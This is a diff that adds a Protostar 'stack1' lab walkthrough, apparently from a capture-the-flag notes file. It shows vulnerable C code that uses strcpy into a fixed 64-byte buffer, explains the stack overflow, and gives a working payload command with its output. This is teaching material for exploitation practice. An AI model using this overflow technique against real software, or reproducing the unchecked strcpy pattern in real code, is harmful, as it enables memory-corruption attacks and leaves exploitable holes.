@@ -89,6 +89,39 @@ gs             0x33     51
    you have changed the 'modified' variable
    ```
    
+Stack1 :
+
+  Same as stack0. Only difference is it requires an argument instead of input.Here strcpy copies argv[1] to buffer. strcpy doesn't check for length of buffer so it will continue writing to the buffer until it finds a null byte. So it can overwrite modified.  
+  ```
+  #include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  if(argc == 1) {
+      errx(1, "please specify an argument\n");
+  }
+
+  modified = 0;
+  strcpy(buffer, argv[1]);
+
+  if(modified == 0x61626364) {
+      printf("you have correctly got the variable to the right value\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+}
+
+  ```
+   Since we already have control over "modified"("BBBB" in stack0) we just need to replace "BBBB" with "dcba ==>(0x64636261)". Since the machine islittle endian the order should be reversed.
    
    
-   
+   ```
+   user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'A' *64 +'dcba'")
+   you have correctly got the variable to the right value
+   ```
